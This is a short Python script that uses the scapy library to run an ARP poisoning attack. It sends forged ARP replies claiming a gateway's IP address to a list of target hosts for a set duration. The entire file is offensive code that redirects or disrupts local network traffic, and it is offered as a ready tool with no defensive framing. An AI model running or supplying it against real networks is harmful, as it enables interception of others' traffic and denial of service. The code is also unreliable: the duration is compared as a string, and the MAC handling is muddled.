import time
from scapy.all import *
from scapy.layers.l2 import ARP


gateway_ip = input("Enter the standard gateway IP address: ")
mac_to_spoof = input("Enter the standard gateway MAC address to spoof: ")
ip_list_file = input("Enter the path to the IP list file: ")
attack_duration = input("Enter the duration of the attack (In Seconds):")

print(f"\n[*] Starting ARP poison attack against {mac_to_spoof}...")
print("[*] Press Ctrl+C to stop the attack.\n")


def arp_poison(ip_to_spoof, mac_to_spoof):
    send(ARP(op=2, pdst=ip_to_spoof, psrc=gateway_ip, hwdst=mac_to_spoof), verbose=0)






start_time = time.time()


print("[*] Sending ARP poison packets...")

try:
    with open(ip_list_file, 'r') as file:
        ip_list = file.read().splitlines()
    
    while time.time() - start_time <= attack_duration:
        for ip_to_spoof in ip_list:
            arp_poison(ip_to_spoof, mac_to_spoof)
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[*] Stopping ARP poison attack...")


print("[*] ARP poison attack complete. Please check the network for any issues.")
